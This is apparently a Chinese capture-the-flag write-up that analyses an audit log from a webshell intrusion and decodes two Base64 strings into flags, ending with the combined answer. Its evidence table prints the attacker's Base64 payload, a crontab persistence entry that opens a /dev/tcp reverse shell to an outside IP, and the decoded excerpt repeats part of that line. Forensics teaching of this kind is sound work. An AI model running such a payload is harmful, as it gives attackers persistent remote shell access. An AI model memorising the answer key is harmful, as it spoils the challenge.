# 029-Webshell日志分析 WP

## 一、题目信息

| 项目 | 内容 |
| --- | --- |
| 题号 | 029 |
| 题目名称 | Webshell日志分析 |
| 题型 | 附件分析题 |
| 提交格式 | `flag(flag1内容+flag2内容)` |
| 题面备注 | 若存在多层嵌套，仅保留一层；拼接时去掉中间加号 |

## 二、分析思路

本题附件为 `sys.log`，内容不是传统 Web 访问日志，而是更接近系统调用与网络收发事件的审计日志。题目明确提示需要从日志中找到 **两个 flag**，因此分析重点不是单纯识别 Webshell 文件名，而是顺着攻击者的落地与数据回显过程，定位日志中真正泄露出的有效内容。

对日志进行关键词筛查后可以发现两个高价值区域。第一处是攻击者投递的一段 Base64 编码计划任务载荷，该载荷解码后直接包含 `flag1`。第二处是数据库返回结果中的另一段 Base64 字符串，该字符串解码后得到 `flag2`。结合题面要求，将两段内容去除嵌套后拼接，即可得到最终答案。

## 三、关键证据链

| 阶段 | 证据 | 说明 |
| --- | --- | --- |
| 发现第一段 flag | 日志中出现 Base64 载荷 `KGVjaG8gImZsYWcxe3ZqNTNtc3hvNXpiOGtiaGN9IjtwcmludGYgIiovNjAgKiAqICogKiBleGVjIDk8PiAvZGV2L3RjcC8xMC4yNS4yMC41Ni81MztleGVjIDA8Jjk7ZXhlYyAxPiY5IDI+JjE7L2Jpbi9iYXNoIC0tbm9wcm9maWxlIC1pO1xybm8gY3JvbnRhYiBmb3IgYHdob2FtaWAgJTEwMGNcbiIpfGNyb250YWIgLQo=` | 这是恶意计划任务内容，解码后直接给出 `flag1{vj53msxo5zb8kbhc}` |
| 发现第二段 flag | 日志第 22511 行附近出现 Base64 字段 `ZmxhZzJ7em44b3BuemtiYWJnYXR1ZX0=` | 该字段来自数据库查询回显，解码后得到 `flag2{zn8opnzkbabgatue}` |
| 按题面拼接 | 去掉 `flag1{}` 与 `flag2{}` 的外层嵌套，仅保留内部内容后拼接 | 得到最终提交值 |

## 四、解码结果

第一段载荷解码结果开头如下：

```text
(echo "flag1{vj53msxo5zb8kbhc}";printf "*/60 * * * * exec 9<> /dev/tcp/10.25.20.56/53;...")|crontab -
```

因此可直接提取：

```text
flag1{vj53msxo5zb8kbhc}
```

第二段 Base64 解码结果为：

```text
flag2{zn8opnzkbabgatue}
```

## 五、答案

按题面要求“若多层嵌套只保留一层，拼接时去掉中间加号”，最终答案为：

```text
flag{vj53msxo5zb8kbhczn8opnzkbabgatue}
```

## 六、结论说明

本题最关键的是避免被海量系统调用日志干扰。虽然日志中同时出现了配置项、数据库字段、上传路径、微信与对象存储相关密钥，但题面明确要求的是两个 flag，因此必须以**可验证的完整编码串**为主线，而不是凭感觉选取任意敏感字段。最终只有上述两段 Base64 内容在解码后直接落到 `flag1{...}` 与 `flag2{...}`，因此答案可以唯一确定。
